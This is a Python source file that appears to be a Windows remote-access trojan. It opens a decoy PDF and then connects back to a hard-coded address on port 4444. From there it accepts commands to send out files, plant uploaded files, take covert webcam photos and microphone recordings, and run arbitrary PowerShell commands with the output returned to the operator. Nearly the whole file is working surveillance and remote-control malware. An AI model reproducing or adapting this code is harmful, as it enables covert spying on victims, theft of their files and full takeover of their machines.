import socket
import subprocess
import time
import os
import cv2
import sys
from datetime import datetime
import sounddevice as sd
from scipy.io.wavfile import write
end_result = "<end_of_result>"
chunk_size = 2048
eof = "<end_of_file>"
while True:

    try:
        pdf_path = "aa.pdf"
        if os.path.exists(pdf_path):
            os.startfile(pdf_path)
        else:
            continue
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(("192.168.10.101",4444))
        
        while True:
            command = client_socket.recv(1024).decode()

            if command.lower() == "stop":
                client_socket.close()
                break

            elif command == "":
                continue
            

            elif command.startswith("download"):
                file_to_download = command.strip("download ")
                if os.path.exists(file_to_download) and os.path.isfile(file_to_download):
                    exists = "yes"
                    client_socket.send(exists.encode())
                    with open(file_to_download, "rb") as file:
                        chunk = file.read(chunk_size)

                        while len(chunk) > 0:
                            client_socket.send(chunk)
                            chunk = file.read(2048)
                        client_socket.send(eof.encode())
                else:
                    exists = "no"
                    client_socket.send(exists.encode())
                    continue
            

            elif command.startswith("upload"):
                 exists = client_socket.recv(1024)

                 if exists.decode() == "yes":
                    answer = "yes"
                    client_socket.send(answer.encode())
                    file_name = command.strip("upload ")
                    with open(file_name, "wb") as download_file:
                        while True:
                            chunk = client_socket.recv(chunk_size)
                            if chunk.endswith(eof.encode()):
                                chunk = chunk[:-len(eof)]
                                download_file.write(chunk)
                                break
                            download_file.write(chunk)

                    # print("File Downloaded successfully")
                
                 else:
                    # print("File not exists")
                    continue

            

            elif command.startswith("take photo"):
                filename = "temp.snap.jpg"
                cam = cv2.VideoCapture(0)
                ret , frame = cam.read()
                cam.release()
                if ret:
                    client_socket.send("yes".encode())
                    os.chdir(r"C:\Users\Lenovo\Desktop\test\\")
                    cv2.imwrite(filename, frame)
                    with open(filename, "rb") as file:
                        chunk = file.read(chunk_size)

                        while len(chunk) > 0:
                            client_socket.send(chunk)
                            chunk = file.read(2048)
                        client_socket.send(eof.encode("cp1256"))
                    os.remove(filename)
                else:
                    client_socket.send("not exisit".encode())
                    continue
            
            elif command.startswith("start record"):
                filename = "temp.wav"
                fs = 16000
                sound = 5
                reco = sd.rec(int(sound * fs), samplerate=fs, channels=2)
                sd.wait()
                write(filename, fs, reco)
                if os.path.exists(filename):
                    client_socket.send("yes".encode())
                    with open(filename, "rb") as file:
                        chunk = file.read(chunk_size)

                        while len(chunk) > 0:
                            client_socket.send(chunk)
                            chunk = file.read(2048)
                        client_socket.send(eof.encode("cp1256"))
                    os.remove(filename)
                else:
                    client_socket.send("not exisit".encode())
                    continue

            elif command.startswith("cd"):
                 new_path = command.strip("cd ")

                 if os.path.exists(new_path):
                        os.chdir(new_path)
                        client_socket.send(new_path.encode())
                        continue
                 else:
                    client_socket.send("not exist this path !".encode())
                    continue

            else:
                output = subprocess.run(["powershell.exe",command],shell=True,capture_output=True)

                if output.stderr.decode("cp1256") == "":
                        result = output.stdout
                        result = result.decode("cp1256") + end_result
                        result = result.encode("cp1256")

                elif output.stderr.decode("cp1256") != "" :
                        result = output.stderr
                        result = result.decode("cp1256") + end_result
                        result = result.encode("cp1256")

                client_socket.sendall(result)

        break
    except Exception:
        time.sleep(1)


